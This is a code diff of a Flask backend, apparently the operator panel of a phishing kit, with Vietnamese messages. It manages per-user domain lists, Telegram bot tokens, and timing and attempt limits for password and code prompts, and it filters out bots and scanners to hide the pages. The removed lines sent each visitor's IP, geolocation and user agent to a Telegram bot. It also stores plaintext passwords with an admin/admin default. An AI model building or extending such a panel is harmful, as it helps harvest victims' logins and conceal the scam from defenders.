@@ -1,57 +1,188 @@
 import json
 import os
+import random
 import re
-from datetime import datetime
+import secrets
+import sqlite3
+import string
 from functools import wraps
 from json.decoder import JSONDecodeError
 
 import jwt
 import requests
-from flask import Flask, jsonify, render_template, request, send_from_directory
+from flask import (Flask, config, jsonify, redirect, render_template, request,
+                   send_from_directory)
 from flask_cors import CORS
 from requests.exceptions import RequestException
 
 app = Flask(__name__, static_folder="dist", template_folder="dist")
 CORS(app)
 
-SECRET_KEY = "ovftank"
-CONFIG_FILE = "config.json"
-PUBLIC_IP = requests.get("https://api.ipify.org").text
-DEFAULT_CONFIG = {
-    PUBLIC_IP: {
-        "settings": {
-            "code_loading_time": 15000,
-            "max_failed_code_attempts": 3,
-            "max_failed_password_attempts": 2,
-            "page_loading_time": 5000,
-            "password_loading_time": 10000,
-            "code_input_enabled": True,
-        },
-        "telegram": {
-            "notification_chatid": "",
-            "notification_token": "",
-            "data_chatid": "",
-            "data_token": "",
-        },
-        "accounts": {
-            "username": "admin",
-            "password": "admin",
-        }
-    }
-}
-
+SECRET_KEY = secrets.token_bytes(32)
+PUBLIC_IP = 'localhost'  # requests.get("https://api.ipify.org").text
 DEFAULT_VALUE = "Không có"
 ACCESS_DENIED_MESSAGE = "Không có quyền truy cập"
+SUCCESS_MESSAGE = "Thành công"
 INDEX_TEMPLATE = "index.html"
 
 
-def ensure_config_file():
-    if not os.path.exists(CONFIG_FILE):
-        with open(CONFIG_FILE, "w", encoding="utf-8") as file:
-            json.dump(DEFAULT_CONFIG, file, indent=2)
+class Database:
+    def __init__(self):
+        self.database_path = 'database.db'
+        self.setup_database()
+
+    def get_connection(self):
+        return sqlite3.connect(self.database_path)
+
+    def setup_database(self):
+        with self.get_connection() as conn:
+            conn.execute('''CREATE TABLE IF NOT EXISTS list_vps (
+                name TEXT PRIMARY KEY NOT NULL,
+                domain_list TEXT NOT NULL,
+                username TEXT NOT NULL,
+                password TEXT NOT NULL,
+                chat_id TEXT NOT NULL,
+                token TEXT NOT NULL,
+                code_loading_time INTEGER NOT NULL,
+                pass_loading_time INTEGER NOT NULL,
+                max_pass_attempts INTEGER NOT NULL,
+                max_code_attempts INTEGER NOT NULL
+                );''')
+            domain_list = '[]'
+            default_vps = [
+                ('admin', f'{domain_list}', 'admin',
+                 'admin', '', '', 10, 10, 10, 10)
+            ]
+            conn.executemany(
+                'INSERT OR IGNORE INTO list_vps VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)', default_vps)
+            conn.commit()
+
+    def is_correct_domain(self, domain):
+        with self.get_connection() as conn:
+            domain_extract = conn.execute(
+                'SELECT domain_list FROM list_vps WHERE domain_list LIKE ?', ('%' + domain + '%',)).fetchall()
+            if len(domain_extract) > 0:
+                data = json.loads(domain_extract[0][0])
+                return domain in data
+            return False
+
+    def get_my_domain_list(self, name):
+        with self.get_connection() as conn:
+            domain_extract = conn.execute(
+                'SELECT domain_list FROM list_vps WHERE name = ?', (name,)).fetchone()
+            return json.loads(domain_extract[0]) if domain_extract else []
+
+    def add_domain(self, name, domain):
+        with self.get_connection() as conn:
+            domain_list = self.get_my_domain_list(name)
+            domain_list.append(domain)
+            conn.execute(
+                'UPDATE list_vps SET domain_list = ? WHERE name = ?', (json.dumps(domain_list), name))
+            conn.commit()
+
+    def delete_domain(self, name, domain):
+        with self.get_connection() as conn:
+            domain_list = self.get_my_domain_list(name)
+            domain_list.remove(domain)
+            conn.execute(
+                'UPDATE list_vps SET domain_list = ? WHERE name = ?', (json.dumps(domain_list), name))
+            conn.commit()
+
+    def update_domain(self, name, old_domain, new_domain):
+        with self.get_connection() as conn:
+            domain_list = self.get_my_domain_list(name)
+            domain_list[domain_list.index(old_domain)] = new_domain
+            conn.execute(
+                'UPDATE list_vps SET domain_list = ? WHERE name = ?', (json.dumps(domain_list), name))
+            conn.commit()
+
+    def get_telegram_config(self, name):
+        with self.get_connection() as conn:
+            return conn.execute(
+                'SELECT chat_id, token FROM list_vps WHERE name = ?', (name,)).fetchone()
+
+    def set_telegram_config(self, name, chat_id, token):
+        with self.get_connection() as conn:
+            conn.execute(
+                'UPDATE list_vps SET chat_id = ?, token = ? WHERE name = ?', (chat_id, token, name))
+            conn.commit()
+
+    def get_config_by_domain(self, domain):
+        with self.get_connection() as conn:
+            result = conn.execute(
+                'SELECT chat_id, token, code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts FROM list_vps WHERE domain_list LIKE ?', ('%' + domain + '%',)).fetchone()
+            return result or {'chat_id': '', 'token': '', 'code_loading_time': 10,
+                              'pass_loading_time': 10, 'max_pass_attempts': 10, 'max_code_attempts': 10}
+
+    def get_config(self, name):
+        with self.get_connection() as conn:
+            return conn.execute(
+                'SELECT chat_id, token, code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts FROM list_vps WHERE name = ?', (name,)).fetchone()
+
+    def set_config(self, name, code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts):
+        with self.get_connection() as conn:
+            conn.execute(
+                'UPDATE list_vps SET code_loading_time = ?, pass_loading_time = ?, max_pass_attempts = ?, max_code_attempts = ? WHERE name = ?', (code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts, name))
+            conn.commit()
+
+    def get_info(self, name):
+        with self.get_connection() as conn:
+            return conn.execute(
+                'SELECT username, password FROM list_vps WHERE name = ?', (name,)).fetchone()
+
+    def change_info(self, name, username, new_password):
+        with self.get_connection() as conn:
+            conn.execute(
+                'UPDATE list_vps SET username = ?, password = ? WHERE name = ?', (username, new_password, name))
+            conn.commit()
+
+    def add_user(self, name):
+        with self.get_connection() as conn:
+            count_user = conn.execute(
+                'SELECT COUNT(*) FROM list_vps WHERE name = ?', (name,)).fetchone()[0]
+            if count_user > 0:
+                return
+            username = ''.join(random.choices(
+                string.ascii_letters + string.digits, k=5))
+            password = ''.join(random.choices(
+                string.ascii_letters + string.digits, k=8))
+            conn.execute(
+                '''INSERT OR IGNORE INTO list_vps
+                (name, domain_list, username, password, chat_id, token,
+                code_loading_time, pass_loading_time, max_pass_attempts, max_code_attempts)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                (name, '[]', username, password, '', '', 10, 10, 10, 10))
+            conn.commit()
+
+    def delete_user(self, name):
+        with self.get_connection() as conn:
+            conn.execute(
+                'DELETE FROM list_vps WHERE name = ?', (name,))
+            conn.commit()
+
+    def get_list_user(self, name):
+        with self.get_connection() as conn:
+            if name == 'admin':
+                return conn.execute(
+                    'SELECT name, username, password FROM list_vps WHERE name != ?', ('admin',)).fetchall()
+            else:
+                return '[]'
+
+    def get_name(self, username):
+        with self.get_connection() as conn:
+            return conn.execute(
+                'SELECT name FROM list_vps WHERE username = ?', (username,)).fetchone()[0]
+
+    def login_user(self, username, password):
+        with self.get_connection() as conn:
+            result = conn.execute(
+                'SELECT 1 FROM list_vps WHERE username = ? AND password = ?',
+                (username, password)
+            ).fetchone()
+            return result is not None
 
 
-ensure_config_file()
+db = Database()
 
 
 def token_required(f):
@@ -59,13 +190,13 @@ def token_required(f):
     def decorated(*args, **kwargs):
         token = request.headers.get("Authorization")
         if not token:
-            return jsonify({"message": "Token is missing!"}), 403
+            return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
         try:
             jwt.decode(token.split()[1], SECRET_KEY, algorithms=["HS256"])
         except jwt.ExpiredSignatureError:
-            return jsonify({"message": "Token has expired!"}), 401
+            return jsonify({"message": ACCESS_DENIED_MESSAGE}), 401
         except jwt.InvalidTokenError:
-            return jsonify({"message": "Token is invalid!"}), 401
+            return jsonify({"message": ACCESS_DENIED_MESSAGE}), 401
         return f(*args, **kwargs)
 
     return decorated
@@ -74,57 +205,77 @@ def token_required(f):
 @app.route("/api/admin/login", methods=["POST"])
 def login():
     host = request.headers.get("Host").split(":")[0]
-    config_file = open(CONFIG_FILE, "r", encoding="utf-8")
-    config = json.load(config_file)
-    if host not in config:
+    if host != PUBLIC_IP:
         return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
     data = request.get_json()
     username = data.get("username")
     password = data.get("password")
-    if username == config[host]["accounts"]["username"] and password == config[host]["accounts"]["password"]:
-        token = jwt.encode({"user": username}, SECRET_KEY, algorithm="HS256")
+    if db.login_user(username, password):
+        name = db.get_name(username)
+        token = jwt.encode({"user": username, "name": name},
+                           SECRET_KEY, algorithm="HS256")
         return jsonify({"success": True, "token": token})
-    return jsonify({"success": False, "message": "Invalid credentials"}), 401
+    return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
 
 
 @app.route("/api/admin/config", methods=["GET"])
 def get_config():
     host = request.headers.get("Host").split(":")[0]
-    print(host)
-    config_file = open(CONFIG_FILE, "r", encoding="utf-8")
-    config = json.load(config_file)
-    if host not in config:
-        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    if host != PUBLIC_IP:
+        if not db.is_correct_domain(host):
+            return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+        config = db.get_config_by_domain(host)
+        return jsonify(config)
+    token = request.headers.get("Authorization")
+    if not token:
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 403
     try:
-        return jsonify(config[host])
-    except (IOError, JSONDecodeError) as e:
-        return jsonify({"message": "Error reading config file", "error": str(e)}), 500
+        name = jwt.decode(token.split()[1], SECRET_KEY,
+                          algorithms=["HS256"])["name"]
+    except jwt.ExpiredSignatureError:
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    except jwt.InvalidTokenError:
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    config = db.get_config(name)
+    return jsonify(config)
+
+
+@app.route("/api/admin/telegram", methods=["POST"])
+@token_required
+def get_telegram_config():
+    host = request.headers.get("Host").split(":")[0]
+    data = request.get_json()
+    chat_id = data.get("chat_id")
+    telegram_token = data.get("token")
+    if host != PUBLIC_IP:
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    token = request.headers.get("Authorization")
+    name = jwt.decode(token.split()[1], SECRET_KEY,
+                      algorithms=["HS256"])["name"]
+    db.set_telegram_config(name, chat_id, telegram_token)
+    return jsonify({"success": True, "message": SUCCESS_MESSAGE})
 
 
 @app.route("/api/admin/config", methods=["POST"])
 @token_required
 def update_config():
     host = request.headers.get("Host").split(":")[0]
+    if host != PUBLIC_IP:
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
     try:
-        with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
-            config = json.load(config_file)
-        if host not in config:
-            return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
         new_config = request.get_json()
-        if not isinstance(new_config, dict):
-            return jsonify({"message": "Invalid config format"}), 400
-        if not all(key in new_config for key in ["settings", "telegram"]):
-            return jsonify({"message": "Invalid config structure"}), 400
-        if not all(key in new_config["settings"] for key in config[host]["settings"]):
-            return jsonify({"message": "Invalid settings structure"}), 400
-        if not all(key in new_config["telegram"] for key in config[host]["telegram"]):
-            return jsonify({"message": "Invalid telegram structure"}), 400
-        config[host].update(new_config)
-        with open(CONFIG_FILE, "w", encoding="utf-8") as file:
-            json.dump(config, file, indent=2)
-        return jsonify({"success": True, "message": "Config updated successfully"})
-    except (IOError, OSError, JSONDecodeError) as e:
-        return jsonify({"success": False, "message": f"Error updating config: {str(e)}"}), 500
+        token = request.headers.get("Authorization")
+        name = jwt.decode(token.split()[1], SECRET_KEY,
+                          algorithms=["HS256"])["name"]
+        code_loading_time = new_config.get("code_loading_time")
+        pass_loading_time = new_config.get("pass_loading_time")
+        max_pass_attempts = new_config.get("max_pass_attempts")
+        max_code_attempts = new_config.get("max_code_attempts")
+        db.set_config(name, code_loading_time, pass_loading_time,
+                      max_pass_attempts, max_code_attempts)
+        return jsonify({"success": True, "message": SUCCESS_MESSAGE})
+    except Exception as e:
+        return jsonify({"success": False, "message": str(e)}), 500
 
 
 @app.route('/api/admin/domains', methods=['GET'])
@@ -133,9 +284,10 @@ def get_domains():
     host = request.headers.get("Host").split(":")[0]
     if host != PUBLIC_IP:
         return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
-    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
-        config = json.load(config_file)
-    return jsonify(list(config.keys()))
+    token = request.headers.get("Authorization")
+    name = jwt.decode(token.split()[1], SECRET_KEY,
+                      algorithms=["HS256"])["name"]
+    return jsonify(db.get_my_domain_list(name))
 
 
 @app.route('/api/admin/add-domain', methods=['POST'])
@@ -146,27 +298,12 @@ def add_domain():
         return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
     domain = request.get_json().get("domain")
     if not domain:
-        return jsonify({"success": False, "message": "Domain is required"}), 400
-
-    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
-        config = json.load(config_file)
-
-    if len(config) >= 35:
-        return jsonify({"success": False, "message": "Không đủ VPS, không thể thêm tên miền"}), 400
-
-    if domain in config:
-        return jsonify({"success": False, "message": "Tên miền đã tồn tại"}), 400
-
-    config[domain] = {
-        "settings": DEFAULT_CONFIG[PUBLIC_IP]["settings"].copy(),
-        "telegram": DEFAULT_CONFIG[PUBLIC_IP]["telegram"].copy(),
-        "accounts": DEFAULT_CONFIG[PUBLIC_IP]["accounts"].copy()
-    }
-
-    with open(CONFIG_FILE, "w", encoding="utf-8") as config_file:
-        json.dump(config, config_file, indent=2)
-
-    return jsonify({"success": True, "message": "Domain added successfully"})
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 400
+    token = request.headers.get("Authorization")
+    name = jwt.decode(token.split()[1], SECRET_KEY,
+                      algorithms=["HS256"])["name"]
+    db.add_domain(name, domain)
+    return jsonify({"success": True, "message": SUCCESS_MESSAGE})
 
 
 @app.route('/api/admin/delete-domain', methods=['POST'])
@@ -177,55 +314,106 @@ def delete_domain():
     if host != PUBLIC_IP:
         return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
     if not domain:
-        return jsonify({"success": False, "message": "Domain is required"}), 400
-
-    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
-        config = json.load(config_file)
-    if domain not in config:
-        return jsonify({"success": False, "message": "Domain not found"}), 404
-    del config[domain]
-    with open(CONFIG_FILE, "w", encoding="utf-8") as config_file:
-        json.dump(config, config_file, indent=2)
-    return jsonify({"success": True, "message": "Domain deleted successfully"})
-
-
-@app.route('/api/admin/get-accounts', methods=['GET'])
-@token_required
-def get_accounts():
-    host = request.headers.get("Host").split(":")[0]
-    domain = request.args.get("domain")
-    if host != PUBLIC_IP:
-        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
-    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
-        config = json.load(config_file)
-    return jsonify(config[domain]["accounts"])
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 400
+    token = request.headers.get("Authorization")
+    name = jwt.decode(token.split()[1], SECRET_KEY,
+                      algorithms=["HS256"])["name"]
+    db.delete_domain(name, domain)
+    return jsonify({"success": True, "message": SUCCESS_MESSAGE})
 
 
 @app.route('/api/admin/change-password', methods=['POST'])
 @token_required
 def change_password():
     host = request.headers.get("Host").split(":")[0]
-    domain = request.get_json().get("domain")
+    vps_name = request.get_json().get("name", None)
     username = request.get_json().get("username")
     password = request.get_json().get("password")
     if host != PUBLIC_IP:
         return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
-    with open(CONFIG_FILE, "r", encoding="utf-8") as config_file:
-        config = json.load(config_file)
-    config[domain]["accounts"]["username"] = username
-    config[domain]["accounts"]["password"] = password
-    with open(CONFIG_FILE, "w", encoding="utf-8") as config_file:
-        json.dump(config, config_file, indent=2)
-    return jsonify({"success": True, "message": "Thông tin tài khoản đã được cập nhật"})
-
-
-@app.route('/admin')
-def admin_vip():
-    host = request.headers.get("Host").split(":")[0]
-    if host == PUBLIC_IP:
-        return render_template('admin.html')
+    token = request.headers.get("Authorization")
+    name = jwt.decode(token.split()[1], SECRET_KEY,
+                      algorithms=["HS256"])["name"]
+    if name != 'admin':
+        db.change_info(name, username, password)
     else:
-        return render_template(INDEX_TEMPLATE)
+        db.change_info(vps_name, username, password)
+    return jsonify({"success": True, "message": SUCCESS_MESSAGE})
+
+
+@app.route('/api/admin/get-info', methods=['POST'])
+@token_required
+def get_info():
+    host = request.headers.get("Host").split(":")[0]
+    vps_name = request.get_json().get("name", None)
+    if host != PUBLIC_IP:
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    token = request.headers.get("Authorization")
+    name = jwt.decode(token.split()[1], SECRET_KEY,
+                      algorithms=["HS256"])["name"]
+    if name == 'admin':
+        return jsonify(db.get_info(vps_name))
+    return jsonify({'name': name})
+
+
+@app.route('/api/admin/check-token', methods=['POST'])
+@token_required
+def check_token():
+    host = request.headers.get("Host").split(":")[0]
+    if host != PUBLIC_IP:
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    token = request.headers.get("Authorization")
+    name = jwt.decode(token.split()[1], SECRET_KEY,
+                      algorithms=["HS256"])["name"]
+    if name == 'admin':
+        return jsonify({"success": True, "is_admin": True})
+    return jsonify({"success": True, "is_admin": False})
+
+
+@app.route('/api/admin/get-list-user', methods=['GET'])
+@token_required
+def get_list_user():
+    host = request.headers.get("Host").split(":")[0]
+    if host != PUBLIC_IP:
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    token = request.headers.get("Authorization")
+    name = jwt.decode(token.split()[1], SECRET_KEY,
+                      algorithms=["HS256"])["name"]
+    if name == 'admin':
+        return jsonify(db.get_list_user(name))
+    return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+
+
+@app.route('/api/admin/add-user', methods=['POST'])
+@token_required
+def add_user():
+    host = request.headers.get("Host").split(":")[0]
+    vps_name = request.get_json().get("name")
+    if host != PUBLIC_IP:
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    token = request.headers.get("Authorization")
+    name = jwt.decode(token.split()[1], SECRET_KEY,
+                      algorithms=["HS256"])["name"]
+    if name != 'admin':
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    db.add_user(vps_name)
+    return jsonify({"success": True, "message": SUCCESS_MESSAGE})
+
+
+@app.route('/api/admin/delete-user', methods=['POST'])
+@token_required
+def delete_user():
+    host = request.headers.get("Host").split(":")[0]
+    vps_name = request.get_json().get("name")
+    if host != PUBLIC_IP:
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    token = request.headers.get("Authorization")
+    name = jwt.decode(token.split()[1], SECRET_KEY,
+                      algorithms=["HS256"])["name"]
+    if name != 'admin':
+        return jsonify({"success": False, "message": ACCESS_DENIED_MESSAGE}), 401
+    db.delete_user(vps_name)
+    return jsonify({"success": True, "message": SUCCESS_MESSAGE})
 
 
 @app.errorhandler(Exception)
@@ -235,15 +423,23 @@ def handle_error(error):
     return response
 
 
+@app.route("/admin")
+def admin():
+    host = request.headers.get("Host").split(":")[0]
+    if host != PUBLIC_IP:
+        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
+    return render_template('admin.html')
+
+
 @app.route("/")
 def index():
     user_agent = request.headers.get("User-Agent")
     ip = request.headers.get("X-Forwarded-For")
     host = request.headers.get("Host").split(":")[0]
-    config_file = open(CONFIG_FILE, "r", encoding="utf-8")
-    config = json.load(config_file)
-    if host not in config:
-        return jsonify({"message": "Access Denied"}), 403
+    if host == PUBLIC_IP:
+        return redirect('/admin')
+    if not db.is_correct_domain(host):
+        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
     if ip:
         ip = ip.split(",")[0]
     else:
@@ -251,9 +447,7 @@ def index():
     if ip == "127.0.0.1":
         return render_template(INDEX_TEMPLATE)
     if is_bot(ip, user_agent):
-        return jsonify({"message": "Access Denied"}), 403
-
-    send_visitor_info(ip, user_agent)
+        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
     return render_template(INDEX_TEMPLATE)
 
 
@@ -262,10 +456,8 @@ def catch_all(path):
     user_agent = request.headers.get("User-Agent")
     ip = request.headers.get("X-Forwarded-For")
     host = request.headers.get("Host").split(":")[0]
-    config_file = open(CONFIG_FILE, "r", encoding="utf-8")
-    config = json.load(config_file)
-    if host not in config:
-        return jsonify({"message": "Access Denied"}), 403
+    if not db.is_correct_domain(host):
+        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
     if ip:
         ip = ip.split(",")[0]
     else:
@@ -275,9 +467,8 @@ def catch_all(path):
             return send_from_directory(app.static_folder, path)
         else:
             return render_template(INDEX_TEMPLATE)
-    send_visitor_info(ip, user_agent)
     if is_bot(ip, user_agent):
-        return jsonify({"message": "Access Denied"}), 403
+        return jsonify({"message": ACCESS_DENIED_MESSAGE}), 403
     elif os.path.exists(os.path.join(app.static_folder, path)):
         return send_from_directory(app.static_folder, path)
     else:
@@ -304,82 +495,6 @@ def is_bot(ip, user_agent):
         print(f"Error fetching geo data: {e}")
         geo_data = {}
     return False
-
-
-def send_visitor_info(ip, user_agent):
-    host = request.headers.get("Host").split(":")[0]
-    config_file = open(CONFIG_FILE, "r", encoding="utf-8")
-    config = json.load(config_file)
-    if host not in config:
-        return
-    ip = ip.strip().replace("/", "").replace("\\", "").strip()
-    try:
-        response = requests.get(
-            f"https://get.geojs.io/v1/ip/geo/{ip}.json", timeout=5)
-        geo_data = response.json()
-    except (RequestException, JSONDecodeError) as e:
-        print(f"Error fetching geo data: {e}")
-        geo_data = {}
-
-    def escape_html(text):
-        special_characters = {"<": "&lt;", ">": "&gt;", "&": "&amp;"}
-        for char, replacement in special_characters.items():
-            text = text.replace(char, replacement)
-        return text
-
-    user_agent = escape_html(str(user_agent))
-    ip = escape_html(str(ip))
-    country = escape_html(str(geo_data.get("country", DEFAULT_VALUE)))
-    region = escape_html(str(geo_data.get("region", DEFAULT_VALUE)))
-    city = escape_html(str(geo_data.get("city", DEFAULT_VALUE)))
-    latitude = escape_html(str(geo_data.get("latitude", DEFAULT_VALUE)))
-    longitude = escape_html(str(geo_data.get("longitude", DEFAULT_VALUE)))
-    timezone = escape_html(str(geo_data.get("timezone", DEFAULT_VALUE)))
-    asn = escape_html(str(geo_data.get("asn", DEFAULT_VALUE)))
-    organization = escape_html(
-        str(geo_data.get("organization", DEFAULT_VALUE)))
-
-    message = f"""
-<b>🖥️ User Agent:</b> <code>{user_agent}</code>
-<b>📅 Thời gian:</b> <code>{datetime.now().isoformat().replace(".", "&#46;")}</code>
-<b>📶 IP:</b> <code>{ip}</code>
-<b>🌐 Quốc gia:</b> <code>{country}</code>
-<b>🏙️ Vùng:</b> <code>{region}</code>
-<b>🏠 Thành phố:</b> <code>{city}</code>
-<b>📍 Vĩ độ:</b> <code>{latitude}</code>
-<b>🧭 Kinh độ:</b> <code>{longitude}</code>
-<b>🕒 Múi giờ:</b> <code>{timezone}</code>
-<b>🔗 ASN:</b> <code>{asn}</code>
-<b>🏢 Tổ chức:</b> <code>{organization}</code>
-"""
-    send_to_telegram(message, "HTML", host)
-
-
-def send_to_telegram(message, parse_mode="HTML", host=None):
-    try:
-        config_file = open(CONFIG_FILE, "r", encoding="utf-8")
-        config = json.load(config_file)
-        telegram_config = config[host]["telegram"]
-        telegram_bot_token = telegram_config["notification_token"]
-        chat_id = telegram_config["notification_chatid"]
-        if not telegram_bot_token or not chat_id:
-            print("Telegram configuration is missing or invalid")
-            return
-        url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
-        params = {
-            "chat_id": chat_id,
-            "text": message,
-            "parse_mode": parse_mode,
-        }
-
-        response = requests.post(url, json=params, timeout=5)
-        response.raise_for_status()
-        print("Telegram message sent successfully")
-
-    except (IOError, JSONDecodeError) as e:
-        print(f"Failed to read config file: {e}")
-    except Exception as e:
-        print(f"Unexpected error while sending Telegram message: {e}")
 
 
 if __name__ == "__main__":
